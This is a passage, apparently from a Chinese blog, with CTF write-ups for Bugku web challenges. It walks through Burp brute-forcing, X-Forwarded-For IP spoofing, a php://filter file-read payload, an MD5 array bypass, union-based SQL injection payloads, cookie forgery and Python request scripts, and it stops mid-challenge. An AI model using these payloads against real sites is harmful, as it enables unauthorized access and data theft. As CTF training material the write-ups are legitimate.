+<p>点击上面的shell.php，会进入一个后台界面，让我们输入密码</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526092646058.png" alt="image-20200526092646058"></p>
+<p>可是我们并不知道密码是多少，所以使用暴力破解，如果一个一个的去试太麻烦了，而且想到的数量太少了，所以使用burp进行抓包。</p>
+<p>现在输入框中随机输入内容，这里我输入的是123，然后打开burp点击网页的登录，进行抓包，不要忘记将Intercept is on打开</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526092921318.png" alt="image-20200526092921318"></p>
+<p>右键，将其发送到intruder模块</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526092943621.png" alt="image-20200526092943621"></p>
+<p>现将123 Clear$掉，然后选中123再Add$一下</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526093025865.png" alt="image-20200526093025865"></p>
+<p>单击Payloads子模块</p>
+<p>选中burp自带的字典，Add from list…选中Passwords，点击Start attack，进行爆破密码</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526093244488.png" alt="image-20200526093244488"></p>
+<p>爆破完成后，可以看到密码是hack</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526093359014.png" alt="image-20200526093359014"></p>
+<p>在页面提交hack，成功返回flag，复制flag提交</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526093420784.png" alt="image-20200526093420784"></p>
+<h4 id="管理员系统"><a href="#管理员系统" class="headerlink" title="管理员系统"></a>管理员系统</h4><p>打开网址</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526095051329.png" alt="image-20200526095051329"></p>
+<p>原始页面</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526095115923.png" alt="image-20200526095115923"></p>
+<p>查看源代码，可以看到有一个base64加密的密文，解密之后得到test123</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526095133950.png" alt="image-20200526095133950"></p>
+<p>因为i管理员系统，账号肯定是admin，密码已经解密出来了是test123</p>
+<p>输入提交，发现并没有返回对应的flag，而是说IP禁止访问，请联系<strong>本地</strong>管理员登录，IP被记录，这说明需要<strong>伪造本地IP</strong>进行访问</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526095240198.png" alt="image-20200526095240198"></p>
+<p>先输入账号密码，，然后使用burp抓包发送到Repeater模块</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526095410043.png" alt="image-20200526095410043"></p>
+<p>加入<code>X-Forwarded-For:127.0.0.1</code>伪造IP，点击GO成功返回flag，复制提交即可</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526095817142.png" alt="image-20200526095817142"></p>
+<h4 id="WEB-4"><a href="#WEB-4" class="headerlink" title="WEB 4"></a>WEB 4</h4><p>打开网址，</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526100105719.png" alt="image-20200526100105719"></p>
+<p>题目提醒了要查看源代码，可以看到好多URL编码</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526100138637.png" alt="image-20200526100138637"></p>
+<p>先复制p1 和 p2的url，将没用的删去</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526100343484.png" alt="image-20200526100343484"></p>
+<p>这里可以看到unescape中的url编码在p1和p2之间，所以将他里面的url放中间，先将p1，p2分隔开防止弄乱，再加入unescape中的url，这里面的单引号全都要删除，还有分号什么的，只要与url编码无关的全都删除</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526100545399.png" alt="image-20200526100545399"></p>
+<p>将多余的空格删除，然后进行解码得到flag，提交，提交时候要加上flag{}将值放到花括号中</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526100735818.png" alt="image-20200526100735818"></p>
+<h4 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h4><p>打开网址</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526104118080.png" alt="image-20200526104118080"></p>
+<p>查看原始页面</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526104928268.png" alt="image-20200526104928268"></p>
+<p>点进click me？no看看，可以看到 test5是show.php中的信息，结合题目给的信息说flag在index中也就是index.php中</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526104959071.png" alt="image-20200526104959071"></p>
+<p>构造任意读取文件的payload：<code>php://filter/read=convert.base64-encode/resource=index.php</code>。</p>
+<p>后面还有很多，复制进行base64解码，将没用的删除</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526105646487.png" alt="image-20200526105646487"></p>
+<p><code>php://filter</code>使我们常用的一种伪协议在任意文件读取，甚至getshell的时候都有利用的机会。这里就是用的任意读取文件</p>
+<p><code>read=&lt;读链的筛选列表&gt;</code>           该参数可选。可以设定一个或多个过滤器名称</p>
+<p>这里读的过滤器为<code>convert.base64-encode</code>，就和字面上的意思一样，把输入流<code>base64-encode</code>。<br><code>resource=index.php</code>，代表读取index.php的内容</p>
+<p>关于<code>convert.*</code>过滤器，可以访问一下网址有详细讲解</p>
+<p><a href="https://www.php.net/manual/zh/filters.convert.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/filters.convert.php</a></p>
+<p>这个刚才页面显示的base64加密的密文</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LWN0ZjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFne2VkdWxjbmlfZWxpZl9sYWNvbF9zaV9zaWh0fQ0KPz4NCjwvaHRtbD4NCg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>我们将其解密得到以下内容，可以看到flag就在其中，复制提交即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;Bugku-ctf&lt;&#x2F;title&gt;</span><br><span class="line">    </span><br><span class="line">&lt;?php</span><br><span class="line">	error_reporting(0);</span><br><span class="line">	if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125;</span><br><span class="line">	$file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">	if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">		echo &quot;Oh no!&quot;;</span><br><span class="line">		exit();</span><br><span class="line">	&#125;</span><br><span class="line">	include($file); </span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">&#x2F;&#x2F;flag:flag&#123;edulcni_elif_lacol_si_siht&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="输入密码查看flag"><a href="#输入密码查看flag" class="headerlink" title="输入密码查看flag"></a>输入密码查看flag</h4><p>打开网址</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526132744362.png" alt="image-20200526132744362"></p>
+<p>查看原始页面，可以看到底下说输入5位数密码查看</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526134606784.png" alt="image-20200526134606784"></p>
+<p>因为是输入密码的，我们直接来爆破试试，先试用burp抓包，发送的Intruder模块进行爆破</p>
+<p>先Clear$在Add$然后选中Payload子模块进行输入爆破数据</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526134751450.png" alt="image-20200526134751450"></p>
+<p>将Payload type改为Number类型，因为是5位数所以从10000开始，先到20000看看能否爆破出来</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526134847802.png" alt="image-20200526134847802"></p>
+<p>点击start attack进行攻击，发现成功爆破。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526135012691.png" alt="image-20200526135012691"></p>
+<p>将密码输入，然后返回了flag，进行提交就可以</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526135042949.png" alt="image-20200526135042949"></p>
+<h4 id="点击一百万次"><a href="#点击一百万次" class="headerlink" title="点击一百万次"></a>点击一百万次</h4><p>打开网址</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607191544649.png" alt="image-20200607191544649"></p>
+<p>查看原始页面</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607191628844.png" alt="image-20200607191628844"></p>
+<p>点击一下曲奇饼，发现数字变成了1</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607191716508.png" alt="image-20200607191716508"></p>
+<p>按F12查看源码</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607191828227.png" alt="image-20200607191828227"></p>
+<p>可以看到是以POST传输的，发现了clicks变量，当它为1000000应该能得到flag</p>
+<p>就在POST中输入clicks=1000000</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607192020389.png" alt="image-20200607192020389"></p>
+<h4 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h4><p>打开网址</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526140001555.png" alt="image-20200526140001555"></p>
+<p>查看原始页面</p>
+<p>可以看到是MD5加密的，我们进行解密</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526140020472.png" alt="image-20200526140020472"></p>
+<p>解密返回是空密码，说明不正确</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526140052804.png" alt="image-20200526140052804"></p>
+<p>他题目是备份，我们使用御剑来进行扫描一下</p>
+<p>有一个.bak后缀的网址，双击打开</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526140130590.png" alt="image-20200526140130590"></p>
+<p>得到了一下代码</p>
+<p>乱码不用管因为编码不同，那里是中文字体无碍。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526140242138.png" alt="image-20200526140242138"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: Norse</span><br><span class="line"> * Date: 2017&#x2F;8&#x2F;6</span><br><span class="line"> * Time: 20:22</span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line">include_once &quot;flag.php&quot;;</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; strstr($_SERVER[&#39;REQUEST_URI&#39;], &#39;?&#39;);</span><br><span class="line">$str &#x3D; substr($str,1);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将$str里的key替换为空字符。</span><br><span class="line">$str &#x3D; str_replace(&#39;key&#39;,&#39;&#39;,$str);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将字符串解析到变量</span><br><span class="line">parse_str($str);</span><br><span class="line">&#x2F;&#x2F;输出MD5加密的key1、key2</span><br><span class="line">echo md5($key1);</span><br><span class="line">echo md5($key2);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 两个值进行判断，如果加密的值相同和未加密的值不同输出flag</span><br><span class="line">if(md5($key1) &#x3D;&#x3D; md5($key2) &amp;&amp; $key1 !&#x3D;&#x3D; $key2)&#123;</span><br><span class="line">    echo $flag.&quot;鍙栧緱flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到其中用到了<code>$str = str_replace(&#39;key&#39;,&#39;&#39;,$str);</code>中的<code>str_replac()</code>函数，按照这串代码得出将$str中得’key’替换为空字符，我们可以使用双写绕过<code>kkeyey</code>下面代码的意思就</p>
+<p>这里就可以使用数组绕过</p>
+<p>构造payload：<code>?kkeyey1[]=1&amp;kkeyey2[]=2</code></p>
+<p>复制结果进行提交。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526141426607.png" alt="image-20200526141426607"></p>
+<h4 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h4><p>打开网页</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526141941730.png" alt="image-20200526141941730"></p>
+<p>原始页面，挡在输入框输入1时返回的结果</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526142058592.png" alt="image-20200526142058592"></p>
+<p>输入2返回的结果</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526142111653.png" alt="image-20200526142111653"></p>
+<p>按F12查看源码</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526142356183.png" alt="image-20200526142356183"></p>
+<p>很明显这是POST注入，name是id</p>
+<p>这里可以手注或者使用sqlmap来跑</p>
+<p>这里都使用一次，先是手注</p>
+<p>我们先进行报错尝试，使用万能单引号看看是否报错</p>
+<p>页面没有返回信息说明错误</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526142454610.png" alt="image-20200526142454610"></p>
+<p>加上–+试试，发现页面还是错误。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526142523435.png" alt="image-20200526142523435"></p>
+<p>可能是因为注释符的原因，更改成#试试，果然页面成功返回正常</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526142556767.png" alt="image-20200526142556767"></p>
+<p>使用order by查看字段数当字段等于4的时候返回正常，等于5的时候页面没有返回值</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526142622712.png" alt="image-20200526142622712"></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526142648785.png" alt="image-20200526142648785"></p>
+<p>union联合查询查看可注入的字段数，要先将id=1‘改为其他的例如：id=-1‘让其报错，不然只会返回正常值，不会显示注入点，当然改成什么都行只要是错误的就可以。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526142944623.png" alt="image-20200526142944623"></p>
+<p>可以看到，2,3,4这三个都可以注入，查看当前数据库或者查看数据库版本</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526143031514.png" alt="image-20200526143031514"></p>
+<p>我们在4的位置上进行注入。</p>
+<p>payload：<code>union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=&#39;skctf_flag&#39;#</code></p>
+<p>返回了两个表名<code>fl4g、sc</code></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526143158111.png" alt="image-20200526143158111"></p>
+<p>flag肯定在fl4g中，一看就知道，查看fl4g中的字段</p>
+<p>Payload：<code>id=-1&#39; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&#39;fl4g&#39;#</code></p>
+<p>返回了<code>skctf_flag</code>字段名。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526143341576.png" alt="image-20200526143341576"></p>
+<p>查看字段中的数据</p>
+<p>Payload：<code>id=-1&#39; union select 1,2,3,group_concat(    skctf_flag) from fl4g#</code></p>
+<p>成功返回flag，复制提交即可</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526143427166.png" alt="image-20200526143427166"></p>
+<h4 id="秋名山老司机"><a href="#秋名山老司机" class="headerlink" title="秋名山老司机"></a>秋名山老司机</h4><p>打开网页</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526193528166.png" alt="image-20200526193528166"></p>
+<p>原始页面。每次刷新页面的值都不同</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526193605590.png" alt="image-20200526193605590"></p>
+<p>他让2秒内计算出那是不可能的，只能上脚本了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># 模块</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"># 网站</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;qiumingshan&#x2F;&#39;</span><br><span class="line"></span><br><span class="line"># 会话保持</span><br><span class="line">s &#x3D; requests.Session()</span><br><span class="line"></span><br><span class="line"># 打开url</span><br><span class="line">source &#x3D; s.get(url)</span><br><span class="line"></span><br><span class="line">#正则表达式，匹配算术计算source.text意思就是将网页信息存储到text中</span><br><span class="line">s_tr &#x3D; re.search(&#39;(\d+[+\-*])+(\d+)&#39;, source.text).group()</span><br><span class="line"></span><br><span class="line"># 将字符串s_tr当成有效的表达式来求值并返回计算结果</span><br><span class="line">result &#x3D; eval(s_tr)</span><br><span class="line"></span><br><span class="line"># 这里可以理解为设立分界线冒号</span><br><span class="line">post &#x3D; &#123;&#39;value&#39;: result&#125;</span><br><span class="line"></span><br><span class="line"># 以post请求输出文本</span><br><span class="line">print(s.post(url, data &#x3D; post).text)</span><br></pre></td></tr></table></figure>
+
+<p>得到flag，因为是一直变化的，所以有可能运行好几次都不返回值，多运行两次就OK。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526194100263.png" alt="image-20200526194100263"></p>
+<h4 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h4><p>打开网址</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526210947209.png" alt="image-20200526210947209"></p>
+<p>查看页面</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526211004806.png" alt="image-20200526211004806"></p>
+<p>使用burp进行抓包，这并不是真正地flag，每次刷新都会改变，所以就可以判断他是要在规定时间内算出来，所以就要写一个脚本</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526211100106.png" alt="image-20200526211100106"></p>
+<p>代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 模块</span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"># 地址</span><br><span class="line">url&#x3D;&#39;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web6&#x2F;&#39;</span><br><span class="line"></span><br><span class="line"># 会话维持</span><br><span class="line">s&#x3D;requests.Session()</span><br><span class="line"></span><br><span class="line"># 打开网址和headers请求头</span><br><span class="line">header &#x3D; s.get(url).headers</span><br><span class="line">print(header)</span><br><span class="line"></span><br><span class="line"># 对其进行base64两次解密</span><br><span class="line"># split() 通过指定分隔符对字符串进行切片</span><br><span class="line"># encode()指定的编码格式编码字符串</span><br><span class="line">flag &#x3D; base64.b64decode(base64.b64decode(header[&#39;flag&#39;]).decode().split(&#39;:&#39;)[1]).decode() </span><br><span class="line"></span><br><span class="line">data&#x3D;&#123;&#39;margin&#39;:flag&#125;</span><br><span class="line"></span><br><span class="line"># 输出</span><br><span class="line">print(s.post(url,data).text)</span><br></pre></td></tr></table></figure>
+
+<p>运行得出flag，复制进行提交</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526211513761.png" alt="image-20200526211513761"></p>
+<p>如果感觉太乱了可以吧get(url)下的print注销掉</p>
+<p><img src="/2020/07/25/bugku/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200526211612820.png" alt="image-20200526211612820"></p>
+<h4 id="Cookie欺骗"><a href="#Cookie欺骗" class="headerlink" title="Cookie欺骗"></a>Cookie欺骗</h4><p>打开网页</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526201414869.png" alt="image-20200526201414869"></p>
+<p>查看页面，返回了一堆不知道是啥玩意的字母，但是可以看到URL中有base64的加密密文。复制进行解码</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526201515056.png" alt="image-20200526201515056"></p>
+<p>解密之后返回了keys.txt</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526201651353.png" alt="image-20200526201651353"></p>
+<p>仿照一下之前的格式，尝试一下将index.php进行加密，并且line=1，这是加密后的index.php</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526201847982.png" alt="image-20200526201847982"></p>
+<p>复制在页面中更改相对应的值，返回了一个error_reporting(0);(错误报告)，将line改为2试试。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526201945215.png" alt="image-20200526201945215"></p>
+<p>发现返回代码了，因为每次只能返回一个，所以我们要写一个脚本，让他全部输出</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526202029410.png" alt="image-20200526202029410"></p>
+<p>使用py写一个脚本，内容如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 模块</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"># 定义一个空字符</span><br><span class="line">s &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line"># 因为之前够早的line每次更改数字都变，所以这里让其循环20直接全部输出</span><br><span class="line">for i in range(0,20):</span><br><span class="line"></span><br><span class="line">    # 在line处加上for循环的i进行每次变更数字</span><br><span class="line">    url &#x3D; &#39;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web11&#x2F;index.php?line&#x3D;&#39;+str(i)+&#39;&amp;filename&#x3D;aW5kZXgucGhw&#39;</span><br><span class="line"></span><br><span class="line">    # 打开url</span><br><span class="line">    s &#x3D; requests.get(url)</span><br><span class="line"></span><br><span class="line">    # 进行输出</span><br><span class="line">    print (s.text)</span><br></pre></td></tr></table></figure>
+
+<p>运行之后得到的结果，可以看到Cookie需要等于margin才能输出，所以需要进行伪造Cookie</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526202305592.png" alt="image-20200526202305592"></p>
+<p>将页面返回到原始的界面，也就是加密的keys.txt的界面</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526202544258.png" alt="image-20200526202544258"></p>
+<p>进行抓包，发送到Repeater模块，在其中伪造Cookie然后GO一下，发现成功返回了flag，复制提交即可</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526202728983.png" alt="image-20200526202728983"></p>
+<h4 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h4><p>打开页面</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527133509908.png" alt="image-20200527133509908"></p>
+<p>查看原页面</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527133633774.png" alt="image-20200527133633774"></p>
+<p>F12查看源码，看到有一个1p.html，访问一下。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527133820886.png" alt="image-20200527133820886"></p>
+<p><code>http://123.206.87.240:8006/test/1p.html</code>，访问这个网址发现返回了这个，说明刚才那个网址进行了重定向</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527133931990.png" alt="image-20200527133931990"></p>
+<p>使用<code>view-source:123.206.87.240:8006/test/1p.html</code>查看1p.html的源代码，看到有URL编码和base64编码</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527134105206.png" alt="image-20200527134105206"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;%3Cscript%3Ewindow.location.href%3D%27http%3A&#x2F;&#x2F;www.bugku.com%27%3B%3C&#x2F;script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E&quot;</span><br></pre></td></tr></table></figure>
+
+<p>先不管是什么编码，因为当中有 URL编码，直接全部复制，进行URL解码，base64编码因为不是相同编码不会进行编译。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527135250644.png" alt="image-20200527135250644"></p>
+<p>将base64的的代码复制进行解密，发现又返回了URL编码，复制URL编码再次去URL解密</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527135327828.png" alt="image-20200527135327828"></p>
+<p>URL解密之后获得了以下的值</p>
